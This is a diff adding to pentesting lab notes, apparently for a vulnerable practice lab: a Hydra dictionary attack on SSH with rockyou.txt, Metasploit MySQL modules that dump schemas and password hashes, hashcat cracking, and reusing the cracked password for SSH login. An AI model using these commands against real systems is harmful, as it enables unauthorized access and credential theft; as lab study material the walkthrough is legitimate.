@@ -82,3 +82,20 @@ Got the info !! 😸
   **Download the username file from here**: [usernames/seclists](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt)\
 **3. Run the exploit:** `run` or `exploit`\
 **Yay !! Got the username [administrator]()**
+
+<h3>Now we'll use Hydra to dictionary attack on ssh with the username for passwords using rockyou.txt</h3>
+
+[rockyou.txt](https://raw.githubusercontent.com/zacheller/rockyou/refs/heads/master/rockyou.txt.tar.gz)\
+**Using hydra :** `hydra -l administrator -P /path/rockyou.txt ssh://<target ip> -t 4`\
+(check man page or hydra --help for more combinations)\
+**Hope you got the password now login to ssh** `ssh administrator@<ip>` then enter password 🙂
+
+## MYSQL Enumeration (Used Vuln Lab)
+**1. Find the port on which mysql db (default port 3306) running using nmap (same as previous command)**\
+**2. Open metasploit and search for mysql_sql** : `search mysql_sql` and select\ 
+  select using `use auxiliary/admin/mysql/mysql_sql` or `use 0` (0 is the index number mentioned in msfconsole)\
+**3. Set the required parameters like RHOSTS USERNAME and PASSWORD and run**\
+**4. Use module `auxiliary/scanner/mysql/mysql_schemadump` to gather more info**\
+**5. Next this module for hashdump `auxiliary/scanner/mysql/mysql_hashdump`**\
+**Got the hashdump and start using hashcat or john to crack the hash** : `hashcat -a 0 -m 300 <hash> /path/rockyou.txt`\
+**After getting the password logged in due to insecure and same password on ssh**
